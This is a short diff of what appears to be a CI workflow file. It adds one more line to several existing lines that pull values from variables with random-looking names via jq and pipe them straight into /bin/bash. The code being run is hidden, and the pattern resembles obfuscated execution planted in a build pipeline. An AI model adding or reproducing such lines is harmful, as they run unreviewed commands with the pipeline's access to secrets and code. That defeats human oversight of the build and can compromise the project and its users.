@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$wjdxc6" | jq -r .ekp0 | /bin/bash
           echo $cdh3893 | jq -r .y927 | /bin/bash
           printf '%s' "$lp1250" | jq -r .td1322 | /bin/bash
+          printf '%s' "$h9" | jq -r .b0 | /bin/bash
 
       - name: Save archive
         if: always()
